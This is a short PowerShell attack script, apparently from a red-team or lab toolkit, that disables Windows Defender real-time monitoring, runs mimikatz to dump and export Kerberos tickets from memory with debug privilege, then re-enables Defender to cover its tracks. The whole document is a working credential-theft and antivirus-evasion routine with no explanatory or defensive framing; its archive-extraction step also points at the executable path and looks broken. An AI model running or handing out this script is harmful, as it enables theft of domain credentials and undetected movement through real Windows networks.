<# Disable Windows Defender #>
Set-MpPreference -DisableRealtimeMonitoring $true

<# Check If Mimikatz#>
$Path = 'C:\"Program Files"\psattack\tools\mimikatz\x64\mimikatz.exe'
$Tools = Test-Path -Path $Path

if (!$Tools) {
    Expand-Archive -Path $Path -DestinationPath "C:\Program Files\psattack\tools\mimikatz"
}

<# Attack #>
. C:\"Program Files"\psattack\tools\mimikatz\x64\mimikatz.exe "log log.txt" "privilege::debug" "sekurlsa::tickets /export" "exit"

<# Enable Windows Defender #>
Set-MpPreference -DisableRealtimeMonitoring $false